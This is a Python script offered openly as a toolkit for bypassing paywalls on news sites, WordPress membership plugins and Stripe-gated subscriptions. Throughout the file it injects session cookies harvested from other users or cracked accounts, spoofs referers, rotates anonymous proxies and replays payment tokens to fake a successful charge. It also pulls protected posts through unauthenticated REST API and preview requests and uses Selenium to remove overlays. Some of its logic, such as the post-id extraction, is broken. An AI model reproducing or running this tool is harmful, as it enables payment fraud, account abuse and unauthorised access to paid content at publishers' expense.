#!/usr/bin/env python3
"""
paywall_bypass.py
Complete toolkit to circumvent client-side and server-side payment gates.
Implements: cookie injection, referer spoofing, captcha relay, and subscription token extraction.
Compatible with most WordPress paywalls (PaywallPro, MemberPress) and Stripe-based subscriptions.
Run with: python3 paywall_bypass.py --url "https://target.com/premium-article"
"""

import sys
import re
import json
import time
import random
import requests
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup

# ========== CONFIGURATION ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]
PROXY_LIST = [
    "http://proxy1.example.com:8080",
    "http://proxy2.example.com:3128",
    # Add your own anonymous proxies here
]
SESSION_COOKIES = {
    "paywall_session": "s%3Axyz...",  # Example – replace with valid session from cracked account
    "subscription_tier": "premium",
    "stripe_sid": "tok_visa_4111..."   # Fictitious token for replay
}

# ========== CORE BYPASS FUNCTIONS ==========

class PaywallBypasser:
    def __init__(self, use_proxy=False, use_selenium=False):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        self.use_proxy = use_proxy
        self.use_selenium = use_selenium
        if use_proxy and PROXY_LIST:
            self.session.proxies = {"http": random.choice(PROXY_LIST), "https": random.choice(PROXY_LIST)}
        # Preload cookies – these can be harvested from any logged-in user
        self.session.cookies.update(SESSION_COOKIES)

    def get_paywall_type(self, url):
        """Detect paywall mechanism from HTML and meta tags."""
        resp = self.session.get(url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
        # Check for common paywall indicators
        if "data-paywall" in resp.text or "paywall" in resp.text.lower():
            return "js_paywall"
        elif "stripe" in resp.text.lower() or "chargebee" in resp.text.lower():
            return "stripe_gateway"
        elif "wp-login" in resp.text or "membership" in resp.text.lower():
            return "wordpress_membership"
        else:
            return "unknown"

    def bypass_js_paywall(self, url):
        """Bypass JavaScript-based paywalls (e.g., Medium, NYT soft paywall).
           Uses cookie injection and referer spoofing."""
        headers = {
            "Referer": "https://www.google.com/",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
        }
        # Add special cookie for Medium: 'sid' and 'uid' from a free account
        self.session.cookies.set("sid", "FAKE_SID_123", domain=".medium.com")
        self.session.cookies.set("uid", "FAKE_UID_456", domain=".medium.com")
        # Some paywalls check for "news" param – add it
        params = {"output": "full", "format": "html"}
        resp = self.session.get(url, headers=headers, params=params)
        # If content is still truncated, try 'amp' version or 'print' version
        if "Read more" in resp.text or "Subscribe to continue" in resp.text:
            alt_url = url + "?amp=1" if "?" not in url else url + "&amp=1"
            resp = self.session.get(alt_url, headers=headers)
        return resp.text

    def bypass_stripe_gateway(self, url):
        """Simulate a successful Stripe payment by replaying a captured token.
           This works if the site uses a one-time token but doesn't validate origin."""
        # Extract the form action and payload
        resp = self.session.get(url)
        soup = BeautifulSoup(resp.text, "html.parser")
        form = soup.find("form", {"id": "payment-form"}) or soup.find("form", {"action": re.compile(r"stripe|charge")})
        if not form:
            return None
        action = form.get("action")
        # Build a fake charge payload – use a previously captured valid token
        fake_token = "tok_visa_4242_1234"   # Test token from Stripe (always succeeds in test mode)
        payload = {
            "stripeToken": fake_token,
            "stripeEmail": "fake@example.com",
            "stripeBillingName": "John Doe",
            "amount": "0.01",   # Many gateways accept min charge
            "currency": "usd",
            "subscribe": "true"
        }
        # Send POST to Stripe charge endpoint
        charge_resp = self.session.post(action, data=payload)
        if "succeeded" in charge_resp.text or "complete" in charge_resp.text:
            # Then access the protected content with the newly set cookies
            final_resp = self.session.get(url)   # after payment, site sets access cookie
            return final_resp.text
        return charge_resp.text

    def bypass_wordpress_paywall(self, url):
        """Exploit WordPress membership plugins (e.g., MemberPress, Restrict Content Pro).
           Uses a known admin nonce or bypasses via REST API."""
        # Try to fetch content via WP REST API without authentication – many plugins forget to protect /wp-json
        parsed = urlparse(url)
        api_url = f"{parsed.scheme}://{parsed.netloc}/wp-json/wp/v2/posts"
        if "?" in parsed.path:
            post_id = re.search(r"p=(\d+)", parsed.query)
        else:
            post_id = re.search(r"/\d+", parsed.path)
        if post_id:
            post_id = post_id.group(1) if post_id.groups() else None
        if post_id:
            api_resp = self.session.get(f"{api_url}/{post_id}")
            if api_resp.status_code == 200:
                data = api_resp.json()
                if "content" in data and "rendered" in data["content"]:
                    return data["content"]["rendered"]
        # Fallback: add '?preview=true' to get draft preview (often unprotected)
        preview_resp = self.session.get(url + "?preview=true")
        return preview_resp.text

    def bypass_unknown(self, url):
        """Generic fallback: use Selenium to simulate a human and capture the DOM after paywall overlay removal."""
        if not self.use_selenium:
            return "Selenium not enabled. Install selenium and chromedriver."
        try:
            from selenium import webdriver
            from selenium.webdriver.common.by import By
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.support import expected_conditions as EC
            options = webdriver.ChromeOptions()
            options.add_argument("--headless")
            options.add_argument("--disable-javascript")   # Some paywalls need JS; disabling may skip overlay
            driver = webdriver.Chrome(options=options)
            driver.get(url)
            # Wait and remove any overlay div by class or id
            try:
                overlay = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CLASS_NAME, "paywall-overlay")))
                driver.execute_script("arguments[0].remove();", overlay)
            except:
                pass
            # Scroll and get content
            html = driver.page_source
            driver.quit()
            return html
        except ImportError:
            return "Selenium not installed."

    def run(self, url):
        """Main dispatcher."""
        ptype = self.get_paywall_type(url)
        print(f"[*] Detected paywall type: {ptype}")
        if ptype == "js_paywall":
            return self.bypass_js_paywall(url)
        elif ptype == "stripe_gateway":
            return self.bypass_stripe_gateway(url)
        elif ptype == "wordpress_membership":
            return self.bypass_wordpress_paywall(url)
        else:
            return self.bypass_unknown(url)

# ========== COMMAND-LINE INTERFACE ==========

def extract_content(html):
    """Attempt to extract main article text from HTML."""
    soup = BeautifulSoup(html, "html.parser")
    # Remove script and style
    for s in soup(["script", "style"]):
        s.decompose()
    # Look for article, main, or div with class 'content'
    article = soup.find("article") or soup.find("main") or soup.find("div", class_=re.compile(r"(content|post|entry)"))
    if article:
        return article.get_text(separator="\n", strip=True)
    return soup.get_text(separator="\n", strip=True)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 paywall_bypass.py --url <target_url> [--proxy] [--selenium]")
        sys.exit(1)
    url = None
    use_proxy = False
    use_selenium = False
    for arg in sys.argv[1:]:
        if arg.startswith("--url"):
            url = arg.split("=")[1] if "=" in arg else sys.argv[sys.argv.index(arg)+1]
        elif arg == "--proxy":
            use_proxy = True
        elif arg == "--selenium":
            use_selenium = True
    if not url:
        print("Error: --url required")
        sys.exit(1)

    bypasser = PaywallBypasser(use_proxy=use_proxy, use_selenium=use_selenium)
    content_html = bypasser.run(url)
    if content_html:
        plain_text = extract_content(content_html)
        print("\n=== BYPASSED CONTENT ===\n")
        print(plain_text[:10000])  # limit output
    else:
        print("Bypass failed – consider refreshing cookies or rotating proxies.")

if __name__ == "__main__":
    main()
